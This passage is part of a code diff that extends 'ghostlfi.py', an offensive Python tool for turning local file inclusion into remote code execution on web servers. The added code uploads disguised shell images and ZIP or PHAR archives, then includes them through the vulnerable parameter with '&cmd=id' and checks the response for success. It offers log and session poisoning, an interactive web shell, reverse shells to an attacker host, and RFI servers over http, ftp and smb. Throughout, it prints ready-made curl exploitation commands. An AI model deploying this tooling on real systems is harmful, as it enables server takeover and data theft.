+            uploaded = input(f"{Fore.YELLOW}Have you uploaded the file? [y/N]: {Style.RESET_ALL}").strip().lower()
+            
+            if uploaded != 'y':
+                print(f"\n{Fore.CYAN}[INSTRUCTIONS]{Style.RESET_ALL}")
+                print(f"1. Go to the file upload form: {original_url}")
+                print(f"2. Upload the appropriate file from /tmp/")
+                print(f"3. Note the upload path if shown")
+                print(f"4. Run this command again and select 'y'")
+                # Restore original URL
+                self.target_url = original_url
+                self.parameter = original_param
+                return False
+            
+            # Get upload path from user
+            custom_path = input(f"{Fore.YELLOW}Enter upload path or full URL (e.g., /profile_images/ OR http://target.com/profile_images/shell.jpg): {Style.RESET_ALL}").strip()
+            if custom_path:
+                upload_path = custom_path
+            
+            # Test based on choice
+            result = False
+            if choice == '1':
+                result = self._test_malicious_image(upload_path, 'shell.gif')
+            elif choice == '2':
+                result = self._test_malicious_image(upload_path, 'shell.jpg')
+            elif choice == '3':
+                result = self._test_malicious_image(upload_path, 'shell.png')
+            elif choice == '4':
+                result = self._test_zip_wrapper(upload_path)
+            elif choice == '5':
+                result = self._test_phar_wrapper(upload_path)
+            elif choice == '6':
+                result = self._test_all_upload_methods(upload_path)
+            else:
+                print(f"{Fore.RED}[✗] Invalid choice{Style.RESET_ALL}")
+            
+            # Restore original URL
+            self.target_url = original_url
+            self.parameter = original_param
+            return result
+                
+        except KeyboardInterrupt:
+            print(f"\n{Fore.YELLOW}[*] Interrupted by user{Style.RESET_ALL}")
+            # Restore original URL
+            self.target_url = original_url
+            self.parameter = original_param
+            return False
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Error: {str(e)}{Style.RESET_ALL}")
+            # Restore original URL
+            self.target_url = original_url
+            self.parameter = original_param
+            return False
+    
+    def _show_file_upload_guide(self, upload_path: str):
+        """Show file upload exploitation guide"""
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[EXPLOITATION WORKFLOW]")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        base_url = self.target_url.split('?')[0]
+        
+        # Method 1: Simple Image Upload
+        print(f"\n{Fore.GREEN}━━━ METHOD 1: Malicious Image (Most Reliable) ━━━{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}Step 1: Upload the image{Style.RESET_ALL}")
+        print(f"  File: /tmp/shell.gif")
+        print(f"  Upload via the web form")
+        
+        print(f"\n{Fore.YELLOW}Step 2: Find uploaded file path{Style.RESET_ALL}")
+        print(f"  - Check page source after upload")
+        print(f"  - Look for: <img src=\"/path/to/shell.gif\">")
+        print(f"  - Or guess: {upload_path}shell.gif")
+        
+        print(f"\n{Fore.YELLOW}Step 3: Include via LFI{Style.RESET_ALL}")
+        print(f"  {base_url}?{self.parameter}={upload_path}shell.gif&cmd=id")
+        
+        print(f"\n{Fore.CYAN}[CURL COMMAND]{Style.RESET_ALL}")
+        print(f"  curl '{base_url}?{self.parameter}={upload_path}shell.gif&cmd=id'")
+        
+        print(f"\n{Fore.CYAN}[TEST WITH BROWSER]{Style.RESET_ALL}")
+        print(f"  {base_url}?{self.parameter}={upload_path}shell.gif&cmd=whoami")
+        
+        # Method 2: ZIP Wrapper
+        print(f"\n{Fore.GREEN}━━━ METHOD 2: ZIP Wrapper (If enabled) ━━━{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}Step 1: Upload the ZIP{Style.RESET_ALL}")
+        print(f"  File: /tmp/shell.jpg (it's actually a ZIP)")
+        print(f"  Upload via the web form")
+        
+        print(f"\n{Fore.YELLOW}Step 2: Include with zip:// wrapper{Style.RESET_ALL}")
+        print(f"  {base_url}?{self.parameter}=zip://{upload_path}shell.jpg%23shell.php&cmd=id")
+        
+        print(f"\n{Fore.CYAN}[CURL COMMAND]{Style.RESET_ALL}")
+        print(f"  curl '{base_url}?{self.parameter}=zip://{upload_path}shell.jpg%23shell.php&cmd=id'")
+        
+        # Method 3: PHAR Wrapper
+        print(f"\n{Fore.GREEN}━━━ METHOD 3: PHAR Wrapper (PHP-specific) ━━━{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}Step 1: Upload the PHAR{Style.RESET_ALL}")
+        print(f"  File: /tmp/shell.jpg (it's actually a PHAR)")
+        print(f"  Upload via the web form")
+        
+        print(f"\n{Fore.YELLOW}Step 2: Include with phar:// wrapper{Style.RESET_ALL}")
+        print(f"  {base_url}?{self.parameter}=phar://{upload_path}shell.jpg/shell.txt&cmd=id")
+        
+        print(f"\n{Fore.CYAN}[CURL COMMAND]{Style.RESET_ALL}")
+        print(f"  curl '{base_url}?{self.parameter}=phar://{upload_path}shell.jpg/shell.txt&cmd=id'")
+        
+        # Troubleshooting
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[TROUBLESHOOTING]")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.YELLOW}If upload path unknown:{Style.RESET_ALL}")
+        print(f"  1. Check page source after upload for image URL")
+        print(f"  2. Look for: <img src='/profile_images/shell.jpg'>")
+        print(f"  3. Extract just the path: /profile_images/")
+        print(f"  4. Or paste full: http://target.com/profile_images/shell.jpg")
+        print(f"     Tool will extract the path automatically!")
+        print(f"  5. Use browser DevTools Network tab")
+        print(f"  6. Fuzz common paths:")
+        print(f"     - ./uploads/, ./profile_images/, ./files/")
+        
+        print(f"\n{Fore.YELLOW}If simple image doesn't work:{Style.RESET_ALL}")
+        print(f"  1. Try different extensions: .gif, .jpg, .png")
+        print(f"  2. Try ZIP wrapper method")
+        print(f"  3. Try PHAR wrapper method")
+        print(f"  4. Check if path traversal needed: ../../uploads/shell.gif")
+        
+        print(f"\n{Fore.YELLOW}If still not working:{Style.RESET_ALL}")
+        print(f"  1. Verify file was actually uploaded")
+        print(f"  2. Check if upload directory is correct")
+        print(f"  3. Try accessing the image directly first")
+        print(f"  4. Ensure include() function allows code execution")
+        
+        print(f"\n{Fore.GREEN}{'='*60}")
+        print(f"[✓] All malicious files created in /tmp/")
+        print(f"[✓] Upload any of them and follow the steps above!")
+        print(f"{'='*60}{Style.RESET_ALL}")
+    
+    def _test_malicious_image(self, upload_path: str, filename: str) -> bool:
+        """Test malicious image exploitation"""
+        print(f"\n{Fore.CYAN}[TESTING] Malicious Image: {filename}{Style.RESET_ALL}")
+        
+        # Clean up upload path
+        original_path = upload_path
+        
+        # If user entered full URL, extract path
+        if 'http://' in upload_path or 'https://' in upload_path:
+            import re
+            match = re.search(r'https?://[^/]+(/.*)', upload_path)
+            if match:
+                upload_path = match.group(1)
+                print(f"{Fore.YELLOW}[*] Extracted path from URL: {upload_path}{Style.RESET_ALL}")
+        
+        # If path contains a filename (user entered existing uploaded file), extract directory
+        if any(upload_path.endswith(ext) for ext in ['.jpg', '.jpeg', '.gif', '.png', '.bmp', '.webp', '.svg']):
+            upload_path = '/'.join(upload_path.split('/')[:-1]) + '/'
+            print(f"{Fore.YELLOW}[*] Extracted directory: {upload_path}{Style.RESET_ALL}")
+        
+        # Ensure path ends with /
+        if not upload_path.endswith('/'):
+            upload_path += '/'
+        
+        test_path = f'{upload_path}{filename}'
+        
+        print(f"{Fore.YELLOW}[*] Testing with: {test_path}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Trying common upload paths...{Style.RESET_ALL}")
+        
+        # Try different path variations
+        paths_to_try = [
+            test_path,
+            f'.{test_path}',
+            f'..{test_path}',
+            f'../..{test_path}',
+            f'./{upload_path}{filename}',
+            f'../{upload_path}{filename}',
+            f'../../{upload_path}{filename}',
+        ]
+        
+        for path in paths_to_try:
+            full_url = f"{self.target_url}?{self.parameter}={path}&cmd=id"
+            print(f"{Fore.YELLOW}[*] Testing: {full_url}{Style.RESET_ALL}")
+            
+            try:
+                response = self._send_payload(path + '&cmd=id', timeout=10)
+                
+                if 'uid=' in response.text and 'gid=' in response.text:
+                    print(f"{Fore.GREEN}[✓] SUCCESS! File upload LFI working!{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}    Path: {path}{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}    Output: {response.text[:300]}{Style.RESET_ALL}")
+                    
+                    self.rce_method = 'file_upload'
+                    self.successful_methods.append(f'File Upload ({filename})')
+                    
+                    # Offer interactive shell
+                    print(f"\n{Fore.GREEN}[✓] RCE Achieved via File Upload!{Style.RESET_ALL}")
+                    shell_choice = input(f"{Fore.YELLOW}Start interactive shell? [Y/n]: {Style.RESET_ALL}").strip().lower()
+                    if shell_choice != 'n':
+                        self.interactive_shell()
+                    
+                    return True
+            except Exception as e:
+                continue
+        
+        print(f"{Fore.RED}[✗] Malicious image method failed{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Make sure:{Style.RESET_ALL}")
+        print(f"  1. File was uploaded successfully")
+        print(f"  2. Upload path is correct")
+        print(f"  3. Try other methods (ZIP/PHAR)")
+        print(f"{Fore.YELLOW}[*] Original path you entered: {original_path}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Tool tested with: {test_path}{Style.RESET_ALL}")
+        return False
+    
+    def _test_zip_wrapper(self, upload_path: str) -> bool:
+        """Test ZIP wrapper exploitation"""
+        print(f"\n{Fore.CYAN}[TESTING] ZIP Wrapper Method{Style.RESET_ALL}")
+        
+        # Clean up upload path
+        original_path = upload_path
+        
+        # If user entered full URL, extract path
+        if 'http://' in upload_path or 'https://' in upload_path:
+            import re
+            match = re.search(r'https?://[^/]+(/.*)', upload_path)
+            if match:
+                upload_path = match.group(1)
+                print(f"{Fore.YELLOW}[*] Extracted path from URL: {upload_path}{Style.RESET_ALL}")
+        
+        # If path contains a filename, extract directory
+        if any(upload_path.endswith(ext) for ext in ['.jpg', '.jpeg', '.gif', '.png', '.bmp', '.webp', '.svg']):
+            upload_path = '/'.join(upload_path.split('/')[:-1]) + '/'
+            print(f"{Fore.YELLOW}[*] Extracted directory: {upload_path}{Style.RESET_ALL}")
+        
+        # Ensure path ends with /
+        if not upload_path.endswith('/'):
+            upload_path += '/'
+        
+        # Remove leading ./ if present for clean path
+        clean_path = upload_path.replace('./', '')
+        
+        print(f"{Fore.YELLOW}[*] Testing with path: {clean_path}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Trying common upload paths with zip:// wrapper...{Style.RESET_ALL}")
+        
+        # Build paths - DO NOT pre-encode # in the zip path!
+        # requests library will handle URL encoding when sending
+        paths_to_try = [
+            f'zip://.{clean_path}shell.jpg#shell.php',
+            f'zip://{clean_path}shell.jpg#shell.php',
+            f'zip://./{clean_path}shell.jpg#shell.php',
+            f'zip://../{clean_path}shell.jpg#shell.php',
+            f'zip://../../{clean_path}shell.jpg#shell.php',
+        ]
+        
+        for path in paths_to_try:
+            full_url = f"{self.target_url}?{self.parameter}={path}&cmd=id"
+            print(f"{Fore.YELLOW}[*] Testing: {full_url}{Style.RESET_ALL}")
+            
+            try:
+                response = self._send_payload(path + '&cmd=id', timeout=10)
+                
+                if 'uid=' in response.text and 'gid=' in response.text:
+                    print(f"{Fore.GREEN}[✓] SUCCESS! ZIP wrapper working!{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}    Path: {path}{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}    Output: {response.text[:300]}{Style.RESET_ALL}")
+                    
+                    self.rce_method = 'zip_wrapper'
+                    self.successful_methods.append('ZIP Wrapper')
+                    
+                    # Offer interactive shell
+                    print(f"\n{Fore.GREEN}[✓] RCE Achieved via ZIP Wrapper!{Style.RESET_ALL}")
+                    shell_choice = input(f"{Fore.YELLOW}Start interactive shell? [Y/n]: {Style.RESET_ALL}").strip().lower()
+                    if shell_choice != 'n':
+                        self.interactive_shell()
+                    
+                    return True
+            except Exception as e:
+                continue
+        
+        print(f"{Fore.RED}[✗] ZIP wrapper method failed{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] ZIP wrapper may not be enabled{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Original path you entered: {original_path}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Tool tested with: {clean_path}shell.jpg{Style.RESET_ALL}")
+        return False
+    
+    def _test_phar_wrapper(self, upload_path: str) -> bool:
+        """Test PHAR wrapper exploitation"""
+        print(f"\n{Fore.CYAN}[TESTING] PHAR Wrapper Method{Style.RESET_ALL}")
+        
+        # Clean up upload path
+        original_path = upload_path
+        
+        # Check if user entered URL without http:// (e.g., "94.237.122.241:41239/path")
+        # Pattern: IP:PORT/path or domain:port/path
+        import re
+        if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+/', upload_path) or re.match(r'^[a-zA-Z0-9.-]+:\d+/', upload_path):
+            print(f"{Fore.YELLOW}[!] Detected URL without http:// prefix{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[!] Input: {upload_path}{Style.RESET_ALL}")
+            # Extract just the path part (everything after port/)
+            parts = upload_path.split('/', 1)
+            if len(parts) > 1:
+                upload_path = '/' + parts[1]
+                print(f"{Fore.GREEN}[*] Extracted path: {upload_path}{Style.RESET_ALL}")
+        
+        # If user entered full URL, extract path
+        elif 'http://' in upload_path or 'https://' in upload_path:
+            match = re.search(r'https?://[^/]+(/.*)', upload_path)
+            if match:
+                upload_path = match.group(1)
+                print(f"{Fore.YELLOW}[*] Extracted path from URL: {upload_path}{Style.RESET_ALL}")
+        
+        # If path contains a filename (ends with common extensions), extract directory
+        if any(upload_path.endswith(ext) for ext in ['.jpg', '.jpeg', '.gif', '.png', '.bmp', '.webp', '.svg']):
+            # Extract directory from filename
+            upload_path = '/'.join(upload_path.split('/')[:-1]) + '/'
+            print(f"{Fore.YELLOW}[*] Extracted directory: {upload_path}{Style.RESET_ALL}")
+        
+        # Ensure path ends with /
+        if not upload_path.endswith('/'):
+            upload_path += '/'
+        
+        # Remove leading ./ if present for clean path
+        clean_path = upload_path.replace('./', '')
+        
+        print(f"{Fore.GREEN}[*] Final path to test: {clean_path}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Trying common upload paths with phar:// wrapper...{Style.RESET_ALL}")
+        
+        # Build paths - DO NOT pre-encode / in the phar path!
+        # requests library will handle URL encoding when sending
+        paths_to_try = [
+            f'phar://.{clean_path}shell.jpg/shell.txt',
+            f'phar://{clean_path}shell.jpg/shell.txt',
+            f'phar://./{clean_path}shell.jpg/shell.txt',
+            f'phar://../{clean_path}shell.jpg/shell.txt',
+            f'phar://../../{clean_path}shell.jpg/shell.txt',
+        ]
+        
+        for path in paths_to_try:
+            full_url = f"{self.target_url}?{self.parameter}={path}&cmd=id"
+            print(f"{Fore.YELLOW}[*] Testing: {full_url}{Style.RESET_ALL}")
+            
+            try:
+                response = self._send_payload(path + '&cmd=id', timeout=10)
+                
+                # Debug: Show response snippet
+                response_snippet = response.text[:500].replace('\n', ' ')
+                print(f"{Fore.CYAN}[DEBUG] Response snippet: {response_snippet[:200]}...{Style.RESET_ALL}")
+                
+                # Check for RCE indicators
+                if 'uid=' in response.text and 'gid=' in response.text:
+                    print(f"{Fore.GREEN}[✓] SUCCESS! PHAR wrapper working!{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}    Path: {path}{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}    Output: {response.text[:300]}{Style.RESET_ALL}")
+                    
+                    self.rce_method = 'phar_wrapper'
+                    self.successful_methods.append('PHAR Wrapper')
+                    
+                    # Offer interactive shell
+                    print(f"\n{Fore.GREEN}[✓] RCE Achieved via PHAR Wrapper!{Style.RESET_ALL}")
+                    shell_choice = input(f"{Fore.YELLOW}Start interactive shell? [Y/n]: {Style.RESET_ALL}").strip().lower()
+                    if shell_choice != 'n':
+                        self.interactive_shell()
+                    
+                    return True
+            except Exception as e:
+                print(f"{Fore.RED}[DEBUG] Error: {str(e)}{Style.RESET_ALL}")
+                continue
+        
+        # If auto-detection failed, ask user
+        print(f"\n{Fore.YELLOW}[!] Automatic detection failed.{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[?] Did you manually verify any of the URLs worked?{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}    Copy one of the URLs above and test in browser.{Style.RESET_ALL}")
+        manual_check = input(f"{Fore.YELLOW}Did it work manually? [y/N]: {Style.RESET_ALL}").strip().lower()
+        
+        if manual_check == 'y':
+            print(f"{Fore.GREEN}[✓] Manual verification successful!{Style.RESET_ALL}")
+            which_url = input(f"{Fore.YELLOW}Which URL worked? (enter number 1-5): {Style.RESET_ALL}").strip()
+            try:
+                url_index = int(which_url) - 1
+                if 0 <= url_index < len(paths_to_try):
+                    working_path = paths_to_try[url_index]
+                    print(f"{Fore.GREEN}[✓] Using: {working_path}{Style.RESET_ALL}")
+                    
+                    self.rce_method = 'phar_wrapper'
+                    self.successful_methods.append('PHAR Wrapper (Manual)')
+                    
+                    # Store the working payload for shell
+                    self.lfi_payload = working_path
+                    
+                    # Offer shells
+                    print(f"\n{Fore.GREEN}[✓] RCE Confirmed via PHAR Wrapper!{Style.RESET_ALL}")
+                    print(f"\n{Fore.CYAN}Choose action:{Style.RESET_ALL}")
+                    print(f"  1 - Interactive web shell")
+                    print(f"  2 - Reverse shell")
+                    print(f"  3 - Both")
+                    print(f"  0 - Skip")
+                    
+                    shell_choice = input(f"{Fore.YELLOW}Select [0-3]: {Style.RESET_ALL}").strip()
+                    
+                    if shell_choice == '1':
+                        self.interactive_shell()
+                    elif shell_choice == '2':
+                        self.generate_reverse_shell()
+                    elif shell_choice == '3':
+                        self.generate_reverse_shell()
+                        input(f"{Fore.YELLOW}Press Enter after setting up listener...{Style.RESET_ALL}")
+                        self.interactive_shell()
+                    
+                    return True
+            except:
+                pass
+        
+        print(f"{Fore.RED}[✗] PHAR wrapper method failed{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] PHAR wrapper may not be enabled{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Original input: {original_path}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Final path used: {clean_path}shell.jpg{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[*] TIP: Enter path like:{Style.RESET_ALL}")
+        print(f"    /profile_images/")
+        print(f"    OR http://target.com/profile_images/shell.jpg")
+        print(f"    NOT: target.com:port/profile_images/  (missing http://)")
+        return False
+    
+    def _test_all_upload_methods(self, upload_path: str) -> bool:
+        """Test all file upload methods automatically"""
+        print(f"\n{Fore.CYAN}[AUTO-TEST] Testing all file upload methods...{Style.RESET_ALL}")
+        
+        # Test malicious images
+        for filename in ['shell.gif', 'shell.jpg', 'shell.png']:
+            print(f"\n{Fore.CYAN}━━━ Testing {filename} ━━━{Style.RESET_ALL}")
+            if self._test_malicious_image(upload_path, filename):
+                return True
+        
+        # Test ZIP wrapper
+        print(f"\n{Fore.CYAN}━━━ Testing ZIP Wrapper ━━━{Style.RESET_ALL}")
+        if self._test_zip_wrapper(upload_path):
+            return True
+        
+        # Test PHAR wrapper
+        print(f"\n{Fore.CYAN}━━━ Testing PHAR Wrapper ━━━{Style.RESET_ALL}")
+        if self._test_phar_wrapper(upload_path):
+            return True
+        
+        print(f"\n{Fore.RED}[✗] All file upload methods failed{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}[SUGGESTIONS]{Style.RESET_ALL}")
+        print(f"1. Verify files were uploaded successfully")
+        print(f"2. Check upload path is correct")
+        print(f"3. Try manual testing with curl commands above")
+        print(f"4. Check if include() allows code execution")
+        
+        return False
+    
+    def test_log_poisoning(self) -> bool:
+        """Automatically test file upload + LFI if files exist"""
+        print(f"\n{Fore.CYAN}[AUTO-TEST] Testing uploaded files...{Style.RESET_ALL}")
+        
+        test_files = ['shell.gif', 'shell.jpg', 'shell.png']
+        
+        for filename in test_files:
+            test_path = f'{upload_path}{filename}'
+            print(f"{Fore.YELLOW}[*] Testing: {test_path}{Style.RESET_ALL}")
+            
+            try:
+                response = self._send_payload(test_path + '&cmd=id', timeout=5)
+                if 'uid=' in response.text and 'gid=' in response.text:
+                    print(f"{Fore.GREEN}[✓] File upload LFI successful with {filename}!{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}    Output: {response.text[:200]}...{Style.RESET_ALL}")
+                    self.rce_method = 'file_upload'
+                    self.successful_methods.append('File Upload LFI')
+                    return True
+            except:
+                pass
+        
+        # Test ZIP wrapper
+        print(f"{Fore.YELLOW}[*] Testing ZIP wrapper...{Style.RESET_ALL}")
+        try:
+            response = self._send_payload(f'zip://{upload_path}shell.jpg%23shell.php&cmd=id', timeout=5)
+            if 'uid=' in response.text:
+                print(f"{Fore.GREEN}[✓] ZIP wrapper successful!{Style.RESET_ALL}")
+                self.rce_method = 'zip_wrapper'
+                return True
+        except:
+            pass
+        
+        # Test PHAR wrapper
+        print(f"{Fore.YELLOW}[*] Testing PHAR wrapper...{Style.RESET_ALL}")
+        try:
+            response = self._send_payload(f'phar://{upload_path}shell.jpg/shell.txt&cmd=id', timeout=5)
+            if 'uid=' in response.text:
+                print(f"{Fore.GREEN}[✓] PHAR wrapper successful!{Style.RESET_ALL}")
+                self.rce_method = 'phar_wrapper'
+                return True
+        except:
+            pass
+        
+        return False
     
     def test_log_poisoning(self) -> bool:
         """Test log poisoning attack"""
@@ -476,8 +1608,31 @@ class UltimateLFIExploiter:
                 
                 if 'uid=' in response.text and 'gid=' in response.text:
                     print(f"{Fore.GREEN}[✓] Log poisoning successful: {log_path}{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}    Output: {response.text[:200]}{Style.RESET_ALL}")
+                    
                     self.rce_method = 'log_poisoning'
                     self.successful_methods.append('log_poisoning')
+                    self.lfi_payload = log_path
+                    
+                    # Offer shells
+                    print(f"\n{Fore.GREEN}[✓] RCE Achieved via Log Poisoning!{Style.RESET_ALL}")
+                    print(f"\n{Fore.CYAN}Choose action:{Style.RESET_ALL}")
+                    print(f"  1 - Interactive web shell")
+                    print(f"  2 - Reverse shell")
+                    print(f"  3 - Both")
+                    print(f"  0 - Skip")
+                    
+                    shell_choice = input(f"{Fore.YELLOW}Select [0-3]: {Style.RESET_ALL}").strip()
+                    
+                    if shell_choice == '1':
+                        self.interactive_shell()
+                    elif shell_choice == '2':
+                        self.generate_reverse_shell()
+                    elif shell_choice == '3':
+                        self.generate_reverse_shell()
+                        input(f"{Fore.YELLOW}Press Enter after setting up listener...{Style.RESET_ALL}")
+                        self.interactive_shell()
+                    
                     return True
             except:
                 continue
@@ -516,8 +1671,32 @@ class UltimateLFIExploiter:
                     
                     if 'uid=' in response.text and 'gid=' in response.text:
                         print(f"{Fore.GREEN}[✓] Session poisoning successful!{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}    Session path: {session_path}{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}    Output: {response.text[:200]}{Style.RESET_ALL}")
+                        
                         self.rce_method = 'session_poisoning'
                         self.successful_methods.append('session_poisoning')
+                        self.lfi_payload = session_path
+                        
+                        # Offer shells
+                        print(f"\n{Fore.GREEN}[✓] RCE Achieved via Session Poisoning!{Style.RESET_ALL}")
+                        print(f"\n{Fore.CYAN}Choose action:{Style.RESET_ALL}")
+                        print(f"  1 - Interactive web shell")
+                        print(f"  2 - Reverse shell")
+                        print(f"  3 - Both")
+                        print(f"  0 - Skip")
+                        
+                        shell_choice = input(f"{Fore.YELLOW}Select [0-3]: {Style.RESET_ALL}").strip()
+                        
+                        if shell_choice == '1':
+                            self.interactive_shell()
+                        elif shell_choice == '2':
+                            self.generate_reverse_shell()
+                        elif shell_choice == '3':
+                            self.generate_reverse_shell()
+                            input(f"{Fore.YELLOW}Press Enter after setting up listener...{Style.RESET_ALL}")
+                            self.interactive_shell()
+                        
                         return True
             
             print(f"{Fore.RED}[✗] Session poisoning failed{Style.RESET_ALL}")
@@ -529,7 +1708,7 @@ class UltimateLFIExploiter:
     # ==================== COMMAND EXECUTION ====================
     
     def execute_command(self, command: str) -> str:
-        """Execute command using discovered RCE method"""
+        """Execute command using the discovered RCE method"""
         try:
             if self.rce_method == 'expect':
                 payload = f'expect://{urllib.parse.quote(command)}'
@@ -579,6 +1758,22 @@ class UltimateLFIExploiter:
                         continue
                 return "Command execution failed"
             
+            elif self.rce_method and self.rce_method.startswith('rfi_'):
+                # RFI command execution
+                protocol = self.rce_method.split('_')[1]
+                # This requires the RFI server to still be running
+                print(f"{Fore.YELLOW}[!] Using RFI method - ensure your {protocol} server is still running{Style.RESET_ALL}")
+                
+                # The RFI payload should have cmd parameter
+                from urllib.parse import urlparse
+                parsed = urlparse(self.target_url)
+                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                
+                # Get the last used RFI payload (this is a limitation - ideally store it)
+                print(f"{Fore.RED}[!] RFI requires manual command execution{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[*] Append: &cmd={urllib.parse.quote(command)}{Style.RESET_ALL}")
+                return f"RFI: Use your browser/curl with &cmd={command}"
+            
             else:
                 return f"{Fore.RED}[!] No RCE method available{Style.RESET_ALL}"
         
@@ -622,7 +1817,8 @@ class UltimateLFIExploiter:
         print(f"{Fore.GREEN}[+] Interactive shell started!{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}[*] RCE Method: {self.rce_method}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}[*] Commands: 'exit' to quit, 'revshell' for reverse shell{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}[*] Commands: 'generate <type>' for payloads{Style.RESET_ALL}\n")
+        print(f"{Fore.YELLOW}[*] Commands: 'generate <type>' for payloads{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Commands: 'rfi <http|ftp|smb>' for RFI setup{Style.RESET_ALL}\n")
         
         while True:
             try:
@@ -636,6 +1832,13 @@ class UltimateLFIExploiter:
                     lhost = input(f"{Fore.YELLOW}Enter your IP: {Style.RESET_ALL}")
                     lport = int(input(f"{Fore.YELLOW}Enter your port [4444]: {Style.RESET_ALL}") or "4444")
                     self.deploy_reverse_shell(lhost, lport)
+                    continue
+                
+                if command.lower().startswith('rfi'):
+                    parts = command.split()
+                    protocol = parts[1] if len(parts) > 1 else 'http'
+                    lhost = input(f"{Fore.YELLOW}Enter your IP: {Style.RESET_ALL}")
+                    self.setup_rfi_server(protocol, lhost)
                     continue
                 
                 if command.lower().startswith('generate'):
@@ -720,6 +1923,13 @@ class UltimateLFIExploiter:
         if self.test_php_input_wrapper():
             return True
         
+        # Phase 3.4: RFI Test
+        print(f"\n{Fore.CYAN}[*] Testing Remote File Inclusion (RFI)...{Style.RESET_ALL}")
+        rfi_possible = self.test_rfi_vulnerability()
+        
+        if rfi_possible:
+            print(f"{Fore.GREEN}[+] RFI is possible! Use --rfi flag for setup instructions{Style.RESET_ALL}")
+        
         # Phase 4: Advanced (if enabled)
         if include_advanced:
             print(f"\n{Fore.CYAN}[ADVANCED] Trying Advanced Techniques{Style.RESET_ALL}")
@@ -733,6 +1943,11 @@ class UltimateLFIExploiter:
         print(f"\n{Fore.RED}{'='*60}")
         print(f"[FAIL] No RCE method successful")
         print(f"{'='*60}{Style.RESET_ALL}")
+        
+        if rfi_possible:
+            print(f"\n{Fore.YELLOW}[*] However, RFI is possible!{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[*] Use: --rfi-setup http/ftp/smb{Style.RESET_ALL}")
+        
         return False
 
     # ==================== UTILITIES ====================
@@ -838,6 +2053,12 @@ Examples:
   python3 ghostlfi.py -u http://target.com/page.php -p file --test-bypass
   python3 ghostlfi.py -u http://target.com/page.php -p file --test-log-poison
   python3 ghostlfi.py -u http://target.com/page.php -p file --test-session-poison
+  python3 ghostlfi.py -u http://target.com/page.php -p file --test-rfi
+  
+  # RFI Server Setup
+  python3 ghostlfi.py -u http://target.com/page.php -p file --rfi-setup http --rfi-lhost 10.10.10.1
+  python3 ghostlfi.py -u http://target.com/page.php -p file --rfi-setup ftp --rfi-lhost 10.10.10.1
+  python3 ghostlfi.py -u http://target.com/page.php -p file --rfi-setup smb --rfi-lhost 10.10.10.1
 
 Ghost Ops Security | For Authorized Testing Only
         '''
@@ -859,6 +2080,16 @@ Ghost Ops Security | For Authorized Testing Only
     parser.add_argument('--test-bypass', action='store_true', help='Test LFI bypass techniques')
     parser.add_argument('--test-log-poison', action='store_true', help='Test log poisoning')
     parser.add_argument('--test-session-poison', action='store_true', help='Test session poisoning')
+    parser.add_argument('--test-file-upload', action='store_true', help='Test file upload + LFI exploitation')
+    parser.add_argument('--upload-path', help='Upload directory path (e.g., ./uploads/)')
+    parser.add_argument('--lfi-url', help='LFI endpoint URL if different from upload page (e.g., http://target.com/index.php)')
+    parser.add_argument('--lfi-param', help='LFI parameter if different from main parameter (e.g., language)')
+    parser.add_argument('--test-rfi', action='store_true', help='Test Remote File Inclusion (RFI)')
+    
+    # RFI Setup
+    parser.add_argument('--rfi-setup', choices=['http', 'ftp', 'smb'], help='Setup RFI server (http/ftp/smb)')
+    parser.add_argument('--rfi-lhost', help='Your IP for RFI server')
+    parser.add_argument('--rfi-lport', type=int, help='Port for RFI server')
     
     # Generation
     parser.add_argument('--generate', choices=['lfi', 'wrappers', 'shells', 'revshell'], help='Generate payloads')
@@ -884,6 +2115,39 @@ Ghost Ops Security | For Authorized Testing Only
     
     if args.test_session_poison:
         exploiter.test_session_poisoning()
+        sys.exit(0)
+    
+    if args.test_file_upload:
+        # Store original values
+        original_url = exploiter.target_url
+        original_param = exploiter.parameter
+        
+        # If LFI is on different page, update before testing
+        if args.lfi_url:
+            print(f"{Fore.CYAN}[*] Upload page: {original_url}{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}[*] LFI page: {args.lfi_url}{Style.RESET_ALL}")
+            exploiter.target_url = args.lfi_url
+            if args.lfi_param:
+                exploiter.parameter = args.lfi_param
+        
+        exploiter.test_file_upload_exploitation(args.upload_path)
+        
+        # Restore original values
